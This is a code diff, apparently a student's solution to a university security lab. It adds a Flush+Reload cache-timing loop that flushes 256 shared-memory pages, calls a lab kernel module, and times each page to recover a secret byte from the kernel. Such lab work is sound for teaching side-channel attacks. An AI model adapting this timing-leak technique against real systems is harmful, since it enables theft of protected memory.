@@ -12,6 +12,8 @@
 #include "lab2.h"
 #include "lab2ipc.h"
 
+#define BLOCK_NUM 256
+#define ITERS 1
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -45,7 +47,23 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
+	int access_time = 1000;
+	int itr = 0;
+	for(;itr<ITERS;) {
+		for(int block = 0; block < BLOCK_NUM; block++) {
+			clflush(shared_memory + 4096*block);
+		}
+	
+		call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
+		for(int block = 0; block < BLOCK_NUM; block++) {
+			access_time = time_access(shared_memory + 4096*block);
+			if(access_time < 200) {
+				leaked_byte = (char) block;
+				itr++;
+			}
+		}
+	}
         // [Part 1]- Fill this in!
         // Feel free to create helper methods as necessary.
         // Use "call_kernel_part1" to interact with the kernel module
